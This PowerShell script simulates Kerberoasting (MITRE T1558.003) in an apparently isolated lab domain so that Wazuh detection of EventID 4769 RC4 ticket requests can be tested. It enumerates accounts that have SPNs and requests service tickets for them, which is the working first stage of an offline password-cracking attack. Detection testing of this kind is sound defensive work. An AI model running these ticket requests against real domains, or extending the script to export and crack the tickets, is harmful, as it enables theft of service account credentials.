<#
.SYNOPSIS
    Simulate Kerberoasting attack (MITRE ATT&CK T1558.003).
.DESCRIPTION
    Requests RC4-encrypted Kerberos service tickets for all accounts with registered
    SPNs. The RC4 downgrade (EncryptionType 0x17) triggers Wazuh rule 100001 via
    EventID 4769. Hashes can be cracked offline to recover service account passwords.
.TARGET
    Run from wkstn01 or dc01 as any domain user.
.MITRE
    T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting
.DETECTION
    EventID: 4769 (Kerberos service ticket requested)
    Indicator: TicketEncryptionType = 0x17 (RC4-HMAC, weak — modern environments use AES)
    Wazuh Rule: 100001
.CLEANUP
    Kerberoasting leaves no persistent artifacts. Tickets expire per domain policy.
#>

#Requires -Version 5.1

Write-Host "=== Kerberoasting Simulation (T1558.003) ===" -ForegroundColor Red
Write-Host "WARNING: Run this only in your isolated lab environment." -ForegroundColor Yellow
Write-Host ""

# Get all accounts with SPNs (Kerberoastable targets)
Write-Host "[*] Enumerating SPNs in corp.techcorp.internal..." -ForegroundColor Cyan
$KerberoastableAccounts = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName, SamAccountName |
    Select-Object SamAccountName, ServicePrincipalName

Write-Host "[+] Found $($KerberoastableAccounts.Count) Kerberoastable accounts:" -ForegroundColor Green
$KerberoastableAccounts | Format-Table -AutoSize

# Request TGS tickets (RC4 downgrade generates EventID 4769 with EncType 0x17)
Write-Host "`n[*] Requesting service tickets (generates EventID 4769)..." -ForegroundColor Cyan
foreach ($Account in $KerberoastableAccounts) {
    foreach ($SPN in $Account.ServicePrincipalName) {
        try {
            # Request a Kerberos service ticket for this SPN
            $Ticket = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new($SPN)
            Write-Host "[+] Ticket requested for: $SPN" -ForegroundColor Green

            # Export ticket bytes (in a real attack, these are extracted and cracked offline)
            $TicketBytes = $Ticket.GetRequest()
            Write-Host "    Ticket bytes: $($TicketBytes.Length) bytes" -ForegroundColor DarkGray
        } catch {
            Write-Warning "Failed to request ticket for $SPN : $_"
        }
    }
}

Write-Host "`n[*] Simulation complete." -ForegroundColor Cyan
Write-Host "[!] Check Wazuh dashboard for EventID 4769 alerts (Rule 100001)." -ForegroundColor Yellow
Write-Host "    Filter: rule.id:100001 or win.system.eventID:4769" -ForegroundColor DarkGray
